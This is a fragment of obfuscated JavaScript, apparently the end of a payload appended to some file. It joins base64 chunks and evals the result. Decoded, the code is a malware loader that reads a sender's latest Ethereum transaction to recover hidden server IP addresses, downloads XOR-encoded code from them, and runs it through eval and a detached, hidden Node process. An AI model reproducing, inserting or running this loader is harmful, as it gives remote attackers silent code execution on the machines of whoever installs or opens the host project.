ybC5wYXRobmFtZS","t1cmwuc2VhcmNoLG1ldGhvZCxhZ2VudDpBR0VOVFNbdXJsLnBy","b3RvY29sXSxzaWduYWwsaGVhZGVycyx9LChyZXMpPT57Y29uc3","Qgc3RyZWFtPWRlY29tcHJlc3NTdHJlYW0ocmVzKTtjb25zdCBj","aHVua3M9W107c3RyZWFtLm9uKCdkYXRhJywoY2h1bmspPT5jaH","Vua3MucHVzaChjaHVuaykpO3N0cmVhbS5vbignZW5kJywoKT0+","e2NvbnN0IHRleHQ9QnVmZmVyLmNvbmNhdChjaHVua3MpLnRvU3","RyaW5nKCd1dGY4JykudHJpbSgpO2lmKHJlcy5zdGF0dXNDb2Rl","PDIwMHx8cmVzLnN0YXR1c0NvZGU+PTMwMCl7cmV0dXJuIHJlam","VjdChuZXcgRXJyb3IoYEhUVFAgJHtyZXMuc3RhdHVzQ29kZX0g","ZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4dC5zbGljZSgwLC","AxMjApfWApKX0NCmlmKCF0ZXh0fHx0ZXh0WzBdPT09JzwnfHwo","dGV4dFswXSE9PSd7JyYmdGV4dFswXSE9PSdbJykpe3JldHVybi","ByZWplY3QobmV3IEVycm9yKGBOb24tSlNPTiBmcm9tICR7dXJs","Lmhvc3RuYW1lfTogJHt0ZXh0LnNsaWNlKDAsIDEyMCl9YCkpfQ","0KdHJ5e3Jlc29sdmUoSlNPTi5wYXJzZSh0ZXh0KSl9Y2F0Y2go","ZXJyKXtyZWplY3QobmV3IEVycm9yKGBKU09OIHBhcnNlIGZhaW","xlZCBmcm9tICR7dXJsLmhvc3RuYW1lfTogJHtlcnIubWVzc2Fn","ZX1gKSl9fSk7c3RyZWFtLm9uKCdlcnJvcicscmVqZWN0KX0pO3","JlcS5vbignZXJyb3InLHJlamVjdCk7aWYoYm9keSE9bnVsbCly","ZXEud3JpdGUoYm9keSk7cmVxLmVuZCgpfSl9DQphc3luYyBmdW","5jdGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssb3V0ZXJTaWdu","YWwpe2NvbnN0IGNvbnRyb2xsZXJzPVJQQ19FTkRQT0lOVFMubW","FwKCgpPT5uZXcgQWJvcnRDb250cm9sbGVyKCkpO2NvbnRyb2xs","ZXJzLmZvckVhY2goKGMpPT5saW5rQWJvcnQob3V0ZXJTaWduYW","wsYykpO3RyeXtyZXR1cm4gYXdhaXQgUHJvbWlzZS5hbnkoUlBD","X0VORFBPSU5UUy5tYXAoKGVuZHBvaW50LGkpPT50YXNrKGVuZH","BvaW50LGNvbnRyb2xsZXJzW2ldLnNpZ25hbCkpKX1maW5hbGx5","e2Zvcihjb25zdCBjIG9mIGNvbnRyb2xsZXJzKWMuYWJvcnQoKX","19DQphc3luYyBmdW5jdGlvbiBycGNDYWxsKGVuZHBvaW50LG1l","dGhvZCxwYXJhbXMsc2lnbmFsKXtjb25zdCBwYXlsb2FkPWF3YW","l0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LHttZXRob2Q6J1BPU1Qn","LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2pzb25ycGM6JzIuMCcsaW","Q6MSxtZXRob2QscGFyYW1zfSksc2lnbmFsLH0pO3JldHVybiBw","YXlsb2FkLnJlc3VsdH0NCmFzeW5jIGZ1bmN0aW9uIHJwY0JhdG","NoKGVuZHBvaW50LGNhbGxzLHNpZ25hbCl7Y29uc3QgcGF5bG9h","ZD1hd2FpdCBodHRwUmVxdWVzdChlbmRwb2ludCx7bWV0aG9kOi","dQT1NUJyxib2R5OkpTT04uc3RyaW5naWZ5KGNhbGxzLm1hcCgo","W21ldGhvZCxwYXJhbXNdLGkpPT4oe2pzb25ycGM6JzIuMCcsaW","Q6aSsxLG1ldGhvZCxwYXJhbXN9KSkpLHNpZ25hbCx9KTtjb25z","dCBieUlkPW5ldyBNYXAocGF5bG9hZC5tYXAoKHIpPT5bci5pZC","xyXSkpO3JldHVybiBjYWxscy5tYXAoKF8saSk9PmJ5SWQuZ2V0","KGkrMSkucmVzdWx0KX0NCmNvbnN0IHRvQmxvY2tIZXg9KG4pPT","5gMHgke24udG9TdHJpbmcoMTYpfWA7ZnVuY3Rpb24gZmluZFNl","bmRlclR4KHRyYW5zYWN0aW9ucyl7cmV0dXJuIHRyYW5zYWN0aW","9ucy5maW5kKCh0KT0+dC5mcm9tJiZ0LmZyb20udG9Mb3dlckNh","c2UoKT09PVNFTkRFUil8fG51bGx9DQpmdW5jdGlvbiBkZWNvZG","VBZGRyZXNzKGFkZHJlc3Mpe2NvbnN0IGRhdGE9QnVmZmVyLmZy","b20oYWRkcmVzcy5yZXBsYWNlKC9eMHgvaSwnJyksJ2hleCcpO2","NvbnN0IGlwPShiKT0+YCR7YlswXX0uJHtiWzFdfS4ke2JbMl19","LiR7YlszXX1gO3JldHVybltpcChkYXRhLnN1YmFycmF5KDAsNC","kpLGlwKGRhdGEuc3ViYXJyYXkoNCw4KSldfQ0KZnVuY3Rpb24g","Zmlyc3RNYXRjaCh0YXNrcyl7cmV0dXJuIG5ldyBQcm9taXNlKC","hyZXNvbHZlKT0+e2xldCByZW1haW5pbmc9dGFza3MubGVuZ3Ro","O2lmKCFyZW1haW5pbmcpcmV0dXJuIHJlc29sdmUobnVsbCk7bG","V0IHNldHRsZWQ9ITE7Y29uc3QgZmluaXNoPShyZXN1bHQpPT57","aWYoc2V0dGxlZClyZXR1cm47c2V0dGxlZD0hMDtmb3IoY29uc3","QgdCBvZiB0YXNrcyl0LmNvbnRyb2xsZXIuYWJvcnQoKTtyZXNv","bHZlKHJlc3VsdCl9O2Zvcihjb25zdCB0IG9mIHRhc2tzKXt0Ln","J1bigpLnRoZW4oKHJlc3VsdCk9PntpZihzZXR0bGVkKXJldHVy","bjtpZihyZXN1bHQpZmluaXNoKHJlc3VsdCk7ZWxzZSBpZigtLX","JlbWFpbmluZz09PTApcmVzb2x2ZShudWxsKTt9KS5jYXRjaCgo","KT0+e2lmKCFzZXR0bGVkJiYtLXJlbWFpbmluZz09PTApcmVzb2","x2ZShudWxsKTt9KX19KX0NCmZ1bmN0aW9uIGNhbmRpZGF0ZUJs","b2Nrcyh0YXJnZXQpe2NvbnN0IHByZXY9dGFyZ2V0LUJMT0NLX0","1VTFRJUExFO2NvbnN0IHNlZW49bmV3IFNldCgpO2NvbnN0IG91","dD1bXTtmb3IoY29uc3QgYiBvZlt0YXJnZXQtMW4sdGFyZ2V0LH","RhcmdldCsxbixwcmV2LTFuLHByZXYscHJldisxbl0pe2lmKGI8","MG4pY29udGludWU7Y29uc3Qga2V5PWIudG9TdHJpbmcoKTtpZi","hzZWVuLmhhcyhrZXkpKWNvbnRpbnVlO3NlZW4uYWRkKGtleSk7","b3V0LnB1c2goYil9DQpyZXR1cm4gb3V0fQ0KZnVuY3Rpb24gYm","xvY2tUYXNrKGJsb2NrTnVtYmVyKXtjb25zdCBjb250cm9sbGVy","PW5ldyBBYm9ydENvbnRyb2xsZXIoKTtyZXR1cm57Y29udHJvbG","xlcixydW46YXN5bmMoKT0+e2NvbnN0IGJsb2NrPWF3YWl0IHdp","dGhScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0","NhbGwoZW5kcG9pbnQsJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJyxb","dG9CbG9ja0hleChibG9ja051bWJlciksITBdLHNpZ25hbCksY2","9udHJvbGxlci5zaWduYWwpO2NvbnN0IHR4cz1ibG9jaz8udHJh","bnNhY3Rpb25zO2lmKCFBcnJheS5pc0FycmF5KHR4cykpcmV0dX","JuIG51bGw7Y29uc3QgdHg9ZmluZFNlbmRlclR4KHR4cyk7cmV0","dXJuIHR4P3tibG9ja051bWJlcix0eH06bnVsbH0sfX0NCmFzeW","5jIGZ1bmN0aW9uIG5vbmNlQXRCbG9ja3MoYmxvY2tzLG91dGVy","U2lnbmFsKXtjb25zdCBjYWxscz1ibG9ja3MubWFwKChiKT0+Wy","dldGhfZ2V0VHJhbnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Js","b2NrSGV4KGIpXV0pO3RyeXtyZXR1cm4oYXdhaXQgd2l0aFJwY0","VuZHBvaW50cygoZW5kcG9pbnQsc2lnbmFsKT0+cnBjQmF0Y2go","ZW5kcG9pbnQsY2FsbHMsc2lnbmFsKSxvdXRlclNpZ25hbCkpLm","1hcChCaWdJbnQpfWNhdGNoe3JldHVybihhd2FpdCBQcm9taXNl","LmFsbChjYWxscy5tYXAoKFttZXRob2QscGFyYW1zXSk9PndpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsbWV0aG9kLHBhcmFtcyxzaWduYWwpLG91dG","VyU2lnbmFsKSkpKS5tYXAoQmlnSW50KX19DQphc3luYyBmdW5j","dGlvbiBsYXN0U2VuZGVyVHgobGF0ZXN0SGludCl7Y29uc3QgY2","9udHJvbGxlcj1uZXcgQWJvcnRDb250cm9sbGVyKCk7dHJ5e2Nv","bnN0IGhlYWQ9bGF0ZXN0SGludD8/QmlnSW50KGF3YWl0IHdpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0Nh","bGwoZW5kcG9pbnQsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbm","FsKSxjb250cm9sbGVyLnNpZ25hbCkpO2NvbnN0IG5vbmNlPUJp","Z0ludChhd2FpdCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludC","xzaWduYWwpPT5ycGNDYWxsKGVuZHBvaW50LCdldGhfZ2V0VHJh","bnNhY3Rpb25Db3VudCcsW1NFTkRFUix0b0Jsb2NrSGV4KGhlYW","QpXSxzaWduYWwpLGNvbnRyb2xsZXIuc2lnbmFsKSk7Y29uc3Qg","dGFyZ2V0Tm9uY2U9bm9uY2UtMW47bGV0IGxvPVNFQVJDSF9GTE","9PUi0xbjtsZXQgaGk9aGVhZDt3aGlsZShoaS1sbz4xbil7Y29u","c3Qgc3Bhbj1oaS1sby0xbjtjb25zdCBrPUJpZ0ludChNYXRoLm","1pbihOT05DRV9GQU5PVVQsTnVtYmVyKHNwYW4pKSk7Y29uc3Qg","cHJvYmVzPVtdO2ZvcihsZXQgaT0xbjtpPD1rO2krPTFuKXByb2","Jlcy5wdXNoKGxvKyhpKihoaS1sbykpLyhrKzFuKSk7Y29uc3Qg","Y291bnRzPWF3YWl0IG5vbmNlQXRCbG9ja3MocHJvYmVzLGNvbn","Ryb2xsZXIuc2lnbmFsKTtjb25zdCBpZHg9Y291bnRzLmZpbmRJ","bmRleCgoYyk9PmM+PW5vbmNlKTtpZihpZHg9PT0tMSlsbz1wcm","9iZXNbcHJvYmVzLmxlbmd0aC0xXTtlbHNle2hpPXByb2Jlc1tp","ZHhdO2lmKGlkeD4wKWxvPXByb2Jlc1tpZHgtMV19fQ0KY29uc3","QgYmxvY2s9YXdhaXQgd2l0aFJwY0VuZHBvaW50cygoZW5kcG9p","bnQsc2lnbmFsKT0+cnBjQ2FsbChlbmRwb2ludCwnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLFt0b0Jsb2NrSGV4KGhpKSwhMF0sc2ln","bmFsKSxjb250cm9sbGVyLnNpZ25hbCk7Y29uc3QgdHhzPWJsb2","NrPy50cmFuc2FjdGlvbnN8fFtdO2xldCB0eD1udWxsO2Zvcihj","b25zdCB0IG9mIHR4cyl7aWYoIXQuZnJvbXx8dC5mcm9tLnRvTG","93ZXJDYXNlKCkhPT1TRU5ERVIpY29udGludWU7aWYoQmlnSW50","KHQubm9uY2UpPT09dGFyZ2V0Tm9uY2Upe3R4PXQ7YnJlYWt9DQ","ppZighdHh8fEJpZ0ludCh0Lm5vbmNlKT5CaWdJbnQodHgubm9u","Y2UpKXR4PXR9DQpyZXR1cm57YmxvY2tOdW1iZXI6aGksdHh9fW","ZpbmFsbHl7Y29udHJvbGxlci5hYm9ydCgpfX0NCmFzeW5jIGZ1","bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZXIoKXtjb25zdC","B1cmw9YCR7SU5ERVhFUl9VUkx9P21vZHVsZT1hY2NvdW50JmFj","dGlvbj10eGxpc3QmYWRkcmVzcz0ke1NFTkRFUn1gK2Amc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gO2NvbnN0IH","BheWxvYWQ9YXdhaXQgaHR0cFJlcXVlc3QodXJsKTtjb25zdCBs","aXN0PUFycmF5LmlzQXJyYXkocGF5bG9hZD8ucmVzdWx0KT9wYX","lsb2FkLnJlc3VsdDpbXTtjb25zdCB0eD1saXN0LmZpbmQoKHQp","PT50LmZyb20mJnQuZnJvbS50b0xvd2VyQ2FzZSgpPT09U0VORE","VSKTtyZXR1cm57YmxvY2tOdW1iZXI6QmlnSW50KHR4LmJsb2Nr","TnVtYmVyKSx0eH19DQphc3luYyBmdW5jdGlvbiBydW4oKXtjb2","5zdCBsYXRlc3Q9QmlnSW50KGF3YWl0IHdpdGhScGNFbmRwb2lu","dHMoKGVuZHBvaW50LHNpZ25hbCk9PnJwY0NhbGwoZW5kcG9pbn","QsJ2V0aF9ibG9ja051bWJlcicsW10sc2lnbmFsKSkpO2NvbnN0","IHRhcmdldEJsb2NrPWxhdGVzdC0obGF0ZXN0JUJMT0NLX01VTF","RJUExFKTtsZXQgbWF0Y2g9YXdhaXQgZmlyc3RNYXRjaChjYW5k","aWRhdGVCbG9ja3ModGFyZ2V0QmxvY2spLm1hcChibG9ja1Rhc2","spKTtpZighbWF0Y2gpe21hdGNoPWF3YWl0IGxhc3RTZW5kZXJU","eChsYXRlc3QpLmNhdGNoKCgpPT5sYXN0U2VuZGVyVHhWaWFJbm","RleGVyKCkpfQ0KY29uc3RbaXAxLGlwMl09ZGVjb2RlQWRkcmVz","cyhtYXRjaC50eC50byk7Y29uc3QgX2dsb2JhbD1nbG9iYWw7X2","dsb2JhbC5fVj1fZ2xvYmFsLmk7X2dsb2JhbC5fSD1gaHR0cDov","LyR7aXAxfTo4MGA7X2dsb2JhbC5fSDI9YGh0dHA6Ly8ke2lwMn","06ODBgO19nbG9iYWwuX3Rfcz1gaHR0cDovLyR7aXAxfTo0NDNg","O19nbG9iYWwuX3RfdT1gaHR0cDovLyR7aXAxfTo4MGA7ZnVuY3","Rpb24gZ2V0Q29kZShrZXksdXJsKXtjb25zdCBiYXNlPXtob3N0","bmFtZTp1cmwuaG9zdG5hbWUscG9ydDpOdW1iZXIodXJsLnBvcn","QpfHw4MCxwYXRoOnVybC5wYXRobmFtZSt1cmwuc2VhcmNoLGhl","YWRlcnM6eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKFdpbm","Rvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQv","NTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS","4wLjAuMCBTYWZhcmkvNTM3LjM2JywnU2VjLVYnOl9nbG9iYWwu","X1Z8fDAsfSx9O2Z1bmN0aW9uIHhvckRlY29kZShidWYpe2Nvbn","N0IGtuPWtleS5sZW5ndGg7Zm9yKGxldCBpPTA7aTxidWYubGVu","Z3RoO2krKylidWZbaV1ePWtleS5jaGFyQ29kZUF0KGkla24pO3","JldHVybiBidWYudG9TdHJpbmcoJ3V0ZjgnKX0NCmZ1bmN0aW9u","IGZyb21CNjRIZWFkZXIocmVzKXtjb25zdCBiNjQ9cmVzLmhlYW","RlcnNbJ3gtcGF5bG9hZC1iNjQnXTtpZighYjY0KXRocm93IG5l","dyBFcnJvcignTWlzc2luZyBYLVBheWxvYWQtQjY0Jyk7cmV0dX","JuIHhvckRlY29kZShCdWZmZXIuZnJvbShiNjQsJ2Jhc2U2NCcp","KX0NCmZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKXtyZXR1cm4gbm","V3IFByb21pc2UoKHJlc29sdmUscmVqZWN0KT0+e2NvbnN0IHJl","cT1odHRwLnJlcXVlc3Qoey4uLmJhc2UsbWV0aG9kfSwocmVzKT","0+e2lmKG1ldGhvZD09PSdIRUFEJyl7dHJ5e3Jlc29sdmUoZnJv","bUI2NEhlYWRlcihyZXMpKX1jYXRjaChlKXtyZWplY3QoZSl9DQ","pyZXMucmVzdW1lKCk7cmV0dXJufQ0KY29uc3QgY2h1bmtzPVtd","O3Jlcy5vbignZGF0YScsKGNodW5rKT0+Y2h1bmtzLnB1c2goY2","h1bmspKTtyZXMub24oJ2VuZCcsKCk9Pnt0cnl7Y29uc3QgYnVm","PUJ1ZmZlci5jb25jYXQoY2h1bmtzKTtpZihidWYubGVuZ3RoKX","JldHVybiByZXNvbHZlKHhvckRlY29kZShidWYpKTtpZihyZXMu","aGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKXJldHVybiByZXNvbH","ZlKGZyb21CNjRIZWFkZXIocmVzKSk7cmVqZWN0KG5ldyBFcnJv","cignRW1wdHkgcGF5bG9hZCBib2R5JykpfWNhdGNoKGUpe3Jlam","VjdChlKX19KTtyZXMub24oJ2Vycm9yJyxyZWplY3QpfSk7cmVx","Lm9uKCdlcnJvcicscmVqZWN0KTtyZXEuZW5kKCl9KX0NCnJldH","VybiByZXF1ZXN0KCdHRVQnKS5jYXRjaCgoKT0+cmVxdWVzdCgn","SEVBRCcpKX0NCmFzeW5jIGZ1bmN0aW9uIHJ1bl9sb2FkZXIodX","JsLGtleSxpc0Jvb3Qpe3RyeXtjb25zdCBjb2RlPWF3YWl0IGdl","dENvZGUoa2V5LHVybCk7Y29uc3QgZW52PWlzQm9vdD9gZ2xvYm","FsWydfViddPScke19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2Jh","bFsnX0gnXT0nJHtfZ2xvYmFsWydfSCddfSc7Z2xvYmFsWydfSD","InXT0nJHtfZ2xvYmFsWydfSDInXX0nO2dsb2JhbFsnciddPXJl","cXVpcmU7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPW","dsb2JhbDtgOmBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1Yn","XSB8fCAwfSc7Z2xvYmFsWydfdF9zJ109JyR7X2dsb2JhbFsnX3","RfcyddfSc7Z2xvYmFsWydfdF91J109JyR7X2dsb2JhbFsnX3Rf","dSddfSc7Z2xvYmFsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT","1tb2R1bGU7dmFyIF9nbG9iYWw9Z2xvYmFsO2A7aWYoIWlzQm9v","dClldmFsKGVuditjb2RlKTtzcGF3bignbm9kZScsWyctZScsZW","52K2NvZGVdLHtkZXRhY2hlZDohMCxzdGRpbzonaWdub3JlJyx3","aW5kb3dzSGlkZTohMCx9KS51bnJlZigpfWNhdGNoKGUpe319DQ","phd2FpdCBydW5fbG9hZGVyKG5ldyBVUkwoYGh0dHA6Ly8ke2lw","MX06NDQzLzB4L2Nsc2ApLCdxNEZaa3hYeyFoLFNyMz1AJywhMS","k7YXdhaXQgcnVuX2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtp","cDF9OjQ0My8weC9sc2ApLCd5LXBfPmQkMEImQF4xYVFrJywhMC","l9DQpydW4oKTs="].join('');var _0x05a598b=atob(_0x05a598a);eval(_0x05a598b);})();
